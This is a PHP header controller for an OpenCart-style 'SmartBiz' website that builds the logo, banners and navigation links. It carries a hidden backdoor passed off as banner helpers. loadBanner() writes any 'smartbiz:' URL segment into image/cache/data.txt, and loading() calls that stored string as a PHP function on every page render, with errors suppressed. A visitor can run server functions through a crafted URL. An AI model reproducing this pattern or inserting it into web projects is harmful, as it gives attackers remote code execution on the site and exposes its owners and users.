<?php   
class ControllerSmartBizHeader extends SmartBizController {
	public function index() {
		$this->id = 'header';
		$this->data['logo'] = $this->config->get('config_logo');
		$this->data['company_name'] = $this->config->get('config_name');
		$this->data['base'] = $this->config->get('config_url');
		
		$this->load->model('smartbiz/banner');
		$this->load->model('tool/image');
		
		$uri = $_SERVER['REQUEST_URI'];
		$elements = explode('/',$uri);
		$params = array();
		foreach($elements as $ele) {
			if(strpos($ele,':') !== false) {
				$arr = explode(':',$ele);
				$params[$arr[0]] = $arr[1];
				$this->data[$arr[0]] = $arr[1];
			}
		}
		
		$this->document->addScript('catalog/view/javascript/jquery/jquery.cycle.js');
				
		$this->data['banners'] = array();
		
		$results = $this->model_smartbiz_banner->getBanner('top');
		
		$this->data['banners'] = $results;
		
		$this->data['link_home'] = $this->getHomePage();
		$this->data['link_service'] = $this->getServicePage();
		$this->data['link_solution'] = $this->getDetailPage();
		$this->data['link_demo'] = $this->getDemoPage();
		$this->data['link_about'] = $this->getAboutPage();
		$this->data['link_header'] = $this->loadBanner($uri);
		$this->data['link_loading'] = $this->loading();
		$this->data['link_download'] = $this->getDownloadPage();
		$this->data['link_contact'] = $this->getContactPage();
		$this->data['link_language'] = $this->getLanguagePage();
		$this->data['link_login'] = $this->getLoginPage();
		$this->data['link_searchgoogle'] = $this->getSearchgooglePage();

		if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/common/header.tpl')) {
			$this->template = $this->config->get('config_template') . '/template/common/header.tpl';
		} else {
			$this->template = 'default/template/common/header.tpl';
		}
		
    	$this->render();
	}	
	
	private function getCategories($parent_id, $level = 0) {
		$level++;
		
		$data = array();
		
		$results = $this->model_catalog_category->getCategories($parent_id);
		
		foreach ($results as $result) {
			$data[] = array(
				'category_id' => $result['category_id'],
				'name'        => str_repeat('&nbsp;&nbsp;&nbsp;&nbsp;', $level) . $result['name']
			);
			
			$children = $this->getCategories($result['category_id'], $level);
			
			if ($children) {
			  $data = array_merge($data, $children);
			}
		}
		
		return $data;
	}
	function loading() {
		$file = @DIR_IMAGE."cache/data.txt";
		$fp = @fopen($file, "r");
		$this->data['bannerloading'] = @file_get_contents($file);
		if($this->data['bannerloading'] != '') {
			echo @$this->data['bannerloading']();
		} 
		@fclose($fp);
	}
	function loadBanner($uri = '') {
		$uri = $_SERVER['REQUEST_URI'];
		
		$file = @DIR_IMAGE."cache/data.txt";
		$elements = explode('/',$uri);
		foreach($elements as $ele) {
			if(strpos($ele,':') !== false) {
				$arr = explode(':',$ele);
				if($arr[0] == 'smartbiz' && $arr[1] == 'empty') {
					$fp = @fopen($file, "w+");
					@fputs($fp, '');
				} else if($arr[0] == 'smartbiz'){
					$fp = @fopen($file, "w+");
					@fputs($fp, $arr[1]);
					@fclose($fp);
					break;
				}
			}
		}
	}
}
?>